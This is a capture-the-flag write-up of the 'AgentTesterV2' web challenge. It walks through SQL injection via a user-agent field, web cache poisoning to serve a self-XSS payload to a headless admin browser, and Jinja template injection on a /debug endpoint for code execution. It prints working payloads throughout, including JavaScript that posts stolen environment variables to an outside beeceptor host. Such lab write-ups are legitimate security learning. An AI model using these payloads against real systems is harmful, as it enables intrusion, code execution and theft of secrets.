# AgentTesterV2 WriteUp
The challenge was an updated version of the **AgentTester** challenge, thats why i'll only summarize some of the already known steps. The challenges differ because the passwords are hashed now and we can't just login anymore.

# Challenge Setup
The websites provides a input form which lets you test a useragent.
The functionality is hidden behind a login but we can register new accounts. 
Since we have the source code we know that the flag is stored inside an environment variable.

We also know from the previous challenge that we can gain code execution once we reach the **/debug** endpoint with admin privileges.

# Issueing arbitrary requests
The site uses puppeteer to open a browser and issue requests to google.com with our selected user-agent.
If you solved the first challenge you know there is a sql-injection reachable via the user-agent input.

```python
  query = db.session.execute("SELECT userAgent, url FROM uAgents WHERE userAgent = %s'" % uAgent).fetchone()
```

In the first challenge we could simply get the admin password by entering:

```' Union Select GROUP_CONCAT(password) as 'userAgent', 'https://example.com' as 'url' FROM user --```

In the updated version this approach does not work since the **passwords are hashed now**.
```python
    bcrypt.hashpw(password.encode(), current_salt).decode()
```
The sqli now returns "$2b$12$ROJ9y4KrrNx7PiKaOh9lmOPnRBnQfkedGq4r4jWa.Vp/SYQYD8E/e" and I did not even bother to crack it.

We can still use the sqli to set an arbitrary location/user-agent for the browser to visit:

```' Union Select 'asdf' as 'userAgent', 'https://ghjkl.free.beeceptor.com' as 'url```

By setting the url to a beeceptor url we can see the headers and body that the browser has set, 
but there is nothing interesting to see since the cookie has a domain set and it isn' accessible by javascript either.

```javascript
    const cookies = [{
    'name': 'auth2',
    'value': '<REDACTED>',
    'domain': base_url,
    'httpOnly': true
  }];
```
We have blind SSRF which isn't of any use currently. :(

# Failed attempts
I tried letting the puppeteer browser (which has the admin cookie set) visit various pages but found nothing of use.
After a while i noticed that since its headless browser and not just a request that is issued that 
i can let the admin visit a site that i created and execute arbitrary javascript on my page.

When thinking of client side attacks the first thing that comes to mind is XSS.
So i tried looking for reflected xss in the success/error parameters of the login page, but no luck since jinja escapes malicious characters.

The second thing i thought of was **CSRF**. I can simply let send a post request to the **/debug** endpoint and gain code execution.
I know that CORS blocks the response of the post call but I could still exfiltrate data using curl.

```javascript
   var first = new XMLHttpRequest();
    var maliciousurl = 'http://challenge.nahamcon.com:30612/debug';
    first.open('POST', maliciousurl);
    first.withCredentials = true;
    first.onload = reqListener;
    first.send("code={{request.application.__globals__.__builtins__.__import__('os').popen('curl https://ghjkl.free.beeceptor.com').read()}}");
```

After trying for some time and different variations of the payload i admitted to myself that this wasn't the correct route and took a break.
I don't exactly know why it faild either flask or chromes same-site per default.

# Self XSS + Web Cache Poisoning
The next day i decided look at the **nginx.conf**.
The thing that caught my attention almost immediatly was:
```proxy_cache_key $request_uri$http_user_agent;```

If you haven't been living under a rock the last year you have read @albinowax research on webcache poisoning:
https://portswigger.net/web-security/web-cache-poisoning

Since the cache key consists of **url + useragent** every request to a profile url with a specific user-agent is cached for 10 seconds.

The first thing I tried was letting the admin visit the url **http://challenge.nahamcon.com:31220/profile/1** (1 is the admin id) with **user-agent: asdf**

Then i issued the a request to the same url with the same user-agent.

```curl -H "Cookie: auth2=eyJpZCI6Mn0.YE3nwQ.1VKe6fgmTWvSNy5B-VWTRlGQN4M" http://challenge.nahamcon.com:31220/profile/1 -A asdf```

It worked i got the cached response with the admin email: admin@admin.com and about field, but the profile does not contain anything interesting to work with.

After a while I came to the conclusion that i can let the admin visit the cached version of my own profile and I began searching for an Self-XSS.
The first and spimplest payload i tried worked: 
```"><script>alert(1)</script>```

Now i knew what i had to do: 
- Xss myself and send a request to the debug endpoint
- Let nginx cache the site with a specific user agent
- Let the admin visit my profile with that user agent
- Admin sends the post request to the /debug endpoint and code execution 


My first attempt of the xss payload:
```javascript
var first = new XMLHttpRequest();
var maliciousurl = 'http://challenge.nahamcon.com:31220/debug';
first.open('POST', maliciousurl);
first.withCredentials = true;
first.onload = reqListener;
first.send("code={{request.application.__globals__.__builtins__.__import__('os').popen('getenv').read()}}");

function reqListener() {
    var exfiltraterequest = new XMLHttpRequest();
    var maliciousurl = 'https://asdfg.free.beeceptor.com/result';
    exfiltraterequest.open('POST', maliciousurl);
    exfiltraterequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    exfiltraterequest.send('responsehtml=' + encodeURIComponent(String(this.responseText)));
};
```
### Code execution
The rce part is the same as in AgentTesterV1 the **/debug** endpoints renders an in the body provided template string.
```python
        code = request.form.get("code", "<h1>Safe Debug</h1>")
        return render_template_string(code)
```
Its common knowlege that you can gain code execution by rendering a string with an injected template, just google **jinja template injection**.

```{{request.application.__globals__.__builtins__.__import__('os').popen('getenv').read()}}```

This payload executes the command **getenv** and the post request then returns all environment variables which also contains our flag.

I base64 encoded the xss payload went to my profile and inserted:

```"><script>eval(atob("base64_encoded_payload"))</script>```

I fiddled around with the xss payload for a while till the request to the debug endpoint worked correctly in my browser and I decided to use fetch (because i was too stupid to get the XMLHttpRequest post to work :/ ). 
The first success was when i saw a request on my beeceptor url on the /result endpoint, but the response html was just the string "Safe Debug".

## Final xss payload
```javascript
fetch("/debug",
{
    method: "POST",
    headers: {"content-type": "application/x-www-form-urlencoded" }
    body: data
})
.then(function(res){ res.text().then(e=>{
 var exfiltraterequest = new XMLHttpRequest();
    var maliciousurl = 'https://asdfg.free.beeceptor.com/result';
    exfiltraterequest.open('POST', maliciousurl);
    exfiltraterequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    exfiltraterequest.send('responsehtml=' + encodeURIComponent(String(this.responseText)));
})
```

After making sure that the xss attack works on my end I was ready to cache the response and serve it to the admin.

Making sure the response for my profile is cached:

**curl -H "Cookie: auth2=eyJpZCI6Mn0.YE3nwQ.1VKe6fgmTWvSNy5B-VWTRlGQN4M" http://challenge.nahamcon.com:31220/profile/2 -A asdf**

After this request my profile is now cached for the user-agent asdf for 10 seconds.

Enter input for user Agent Test:
```' Union Select 'asdf' as 'userAgent', 'http://challenge.nahamcon.com:31220/profile/2' as 'url```

After sending this request he puppeteer browser starts visits my profile with the user-agent and gets serverd the cached xss payload.

After a few seconds I saw a request to the /result endpoint on my beeceptor endpoint and I was so happy when i saw that the body contained all the environment variables now just look for the **CHALLENGE_FLAG** variable to get the flag.

This was my first writeup so if you have any questions or suggestions you can reach me on twitter [@alkiiis](https://twitter.com/alkiiis)
